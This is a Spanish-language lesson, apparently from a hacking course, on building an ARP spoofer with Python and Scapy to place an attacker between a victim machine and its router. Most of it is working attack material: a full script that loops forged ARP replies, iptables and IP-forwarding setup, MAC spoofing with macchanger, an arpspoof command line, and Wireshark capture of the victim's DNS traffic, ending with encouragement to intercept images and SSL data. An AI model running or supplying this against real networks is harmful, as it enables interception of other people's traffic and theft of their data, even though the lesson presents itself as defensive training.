
----
- TAG: #Desarrollo #Ataque #Suplantación #ARP #Spoofer #Scapy 
-----
En esta clase, nos centraremos en la creación de un envenenador ARP (**ARP Spoofer**) utilizando Scapy, una herramienta esencial de Python para el análisis y manipulación de paquetes de red. El ARP Spoofing es una técnica de ataque en redes donde un atacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.

El concepto de **Man-In-The-Middle** (**MITM**) es crucial aquí, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas a las solicitudes ARP son legítimas.

Durante la clase, exploraremos cómo Scapy puede ser utilizado para implementar este tipo de ataque, proporcionando una comprensión profunda de cómo funciona el ARP Spoofing y por qué es una amenaza significativa en las redes. Esta experiencia práctica te dotará de las habilidades necesarias para identificar y prevenir estos ataques en entornos reales, fortaleciendo tu comprensión y habilidades en ciberseguridad.

---

### ARP Spoofing Manual con Scapy y Herramientas Automatizadas

En esta guía, configuraremos manualmente un ataque de ARP Spoofing usando **Scapy** en Python. Luego, exploraremos una herramienta automatizada para facilitar el proceso.

### Requisitos

- **Máquina Windows** (no virtualizada): Si tienes un portátil u otro dispositivo, intenta realizar el envenenamiento ARP en ese dispositivo. **No uses VMware o VirtualBox**, ya que las máquinas virtuales suelen compartir la misma tarjeta de red. Esto podría hacer que todo el tráfico sea interceptado sin necesidad de envenenamiento ARP, lo cual no es nuestro objetivo en este ejercicio.

### Configuración Previa en Linux

Antes de crear el script, necesitamos realizar algunas configuraciones en el sistema Linux con `iptables` y activar el reenvío de paquetes.

1. **Permitir el reenvío de paquetes:**

   ```bash
   iptables --policy FORWARD ACCEPT
   ```

   Este comando permite que la máquina Linux acepte paquetes entrantes para reenviarlos al destino adecuado.

2. **Activar el reenvío de IPs:**

   ```bash
   cat /proc/sys/net/ipv4/ip_forward
   ```

   Si ves un `0`, debes cambiarlo a `1` para habilitar el reenvío de IPs.

   ```bash
   echo 1 > /proc/sys/net/ipv4/ip_forward
   ```

   Esto es fundamental para que los paquetes puedan ser reenviados entre los dispositivos.

---

### Creación del Script `arp_spoof.py`

Este script generará respuestas ARP falsas para redirigir el tráfico entre el router y una máquina Windows.

```python
#!/usr/bin/python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

# Maneja la señal para salir del programa de forma limpia
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Captura los argumentos de línea de comandos
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="IP de la máquina objetivo")
    return parser.parse_args()

# Función para enviar paquetes ARP falsos
def spoof(ip_address, spoof_ip):
    # Crear paquete ARP: op=2 indica una respuesta ARP, no una solicitud
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)

# Función principal que ejecuta el ataque en bucle
def main():
    arguments = get_arguments()
    
    while True:
        # Falsifica la dirección MAC del router hacia la máquina objetivo
        spoof(arguments.ip_address, "192.168.1.1")
        # Falsifica la dirección MAC de la máquina objetivo hacia el router
        spoof("192.168.1.1", arguments.ip_address)
        time.sleep(2)  # Envía paquetes cada 2 segundos

# Configura una señal para manejar Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    main()
```

### Explicación del Script

1. **Captura de Argumentos:**
   Usamos `argparse` para capturar la IP del objetivo (`-t` o `--target`).

2. **Paquetes ARP:**
   Utilizamos `scapy` para crear y enviar paquetes ARP con:
   - `op=2`: Indica una **respuesta ARP**, aunque no fue solicitada.
   - `psrc`: Es la dirección IP que estamos suplantando (en este caso, la del router).
   - `pdst`: Es la IP del objetivo (la máquina Windows).
   - `hwsrc`: Nuestra **falsa** dirección MAC que se enviará.

3. **Ciclo Infinito:**
   El ataque se realiza en bucle, enviando paquetes ARP cada 2 segundos para mantener el envenenamiento.

### Verificación de Direcciones IP y MAC

Para obtener la IP y MAC de la máquina Windows, usa los siguientes comandos:

- **IP Address (Windows):**

  ```cmd
  ipconfig
  ```

- **Direcciones MAC (Linux):**

  ```bash
  arp -a
  ```

### Cambiar Dirección MAC en Linux

Para cambiar la dirección MAC de tu interfaz de red en Linux:

1. Apaga la interfaz:

   ```bash
   ifconfig eth0 down
   ```

2. Cambia la dirección MAC:

   ```bash
   macchanger --mac=aa:bb:cc:44:55:66 eth0
   ```

3. Vuelve a subir la interfaz:

   ```bash
   ifconfig eth0 up
   ```

4. Verifica el cambio:

   ```bash
   macchanger -s eth0
   ```

### Ejecución del Script

Para correr el script y ver el cambio de dirección MAC en la máquina Windows:

```bash
python3 arp_spoof.py -t 1.2.3.4
```

Verifica la tabla ARP en Windows con:

```bash
arp -a
```

Si todo salió bien, deberías ver la dirección **MAC** que has asignado en el script.

### Interceptar Tráfico con Wireshark

Usa Wireshark para interceptar tráfico desde la máquina Windows:

1. Abre Wireshark en Linux y selecciona tu interfaz `eth0`.
2. Filtra las consultas DNS:

   ```bash
   dns.qry.name == "hack4u.io"
   ```

### Herramientas Automatizadas: `arpspoof`

Si prefieres una herramienta que automatice todo el proceso, puedes usar `arpspoof`:

```bash
arpspoof -i eth0 -t (IP de la víctima) -r (IP del router)
```

---

Con esto has completado un ataque **Man in the Middle** manual y automatizado. ¡Sigue practicando para interceptar diferentes tipos de tráfico, como imágenes y datos SSL, en futuros ejercicios!

---
